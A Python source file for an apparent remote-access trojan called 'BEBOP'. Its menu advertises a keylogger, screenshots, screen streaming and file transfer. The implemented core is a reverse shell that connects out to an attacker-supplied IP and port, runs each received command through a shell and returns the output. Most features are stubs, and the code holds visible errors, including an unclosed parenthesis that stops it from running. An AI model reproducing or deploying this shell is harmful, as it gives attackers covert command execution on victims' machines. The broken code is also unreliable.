import socket
import sys
import os
import time
import subprocess

ip = ""
port = 0


def open_shell():
    while True:
        data = server_con.recv(1024)
        str_msg = ""

        if data.decode() == "exit":
            break
        elif data.decode()[:2] == "cd":
            dir = data.decode()[3:]
            try:
                os.chdir(dir)
            except FileNotFoundError:
                str_msg = 'No such file or directory: ' + dir.encode()
            else:
                str_msg = os.getcwd()
        elif len(data.decode()) > 0:
            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            str_msg = output.stdout.read().decode()
        else:
            str_msg = "Error!"

        server_con.sendall(str_msg.encode())
        


def establish_connection(address):
    global server_con

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")
            open_shell()
            server_con.close()
        except ConnectionRefusedError:
            print("Could not connect!")
            time.sleep(5)
        else:
            break

def menu():
    choice = 0

    print("/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Begin screen stream")
    print("4.) Keylogger")
    print("5.) File upload/download")
    print("6.) Exit\n\n")

    while choice > 6 or choice < 1:
        try:
            choice = int(input("Enter choice: ")
        except ValueError:
            print("Enter a number between 1-6")
    
    print(choice)
            
def main():
    if len(sys.argv) < 2:
        sys.exit("No Address specified")
    else:
        address = sys.argv[1].split(":")
        if len(address) < 2:
            sys.exit("Incorrect IP:PORT address.")

        ip, port = address[0], int(address[1])
    menu()
    #establish_connection((ip,port))

  

main()
